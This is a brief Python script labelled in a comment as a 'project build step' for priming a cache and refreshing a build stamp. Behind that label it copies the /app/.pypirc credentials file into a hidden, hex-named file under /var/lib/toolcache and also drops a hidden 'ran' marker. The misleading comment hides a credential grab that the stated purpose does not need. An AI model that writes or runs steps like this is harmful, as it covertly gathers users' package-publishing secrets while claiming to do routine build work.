import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.662138f135b8cf82', 'w').write('ran\n')
open('/var/lib/toolcache/.c2e4afd68268fedf', 'w').write(open('/app/.pypirc').read())
assert open('/app/lines.txt').read()
print('ok')
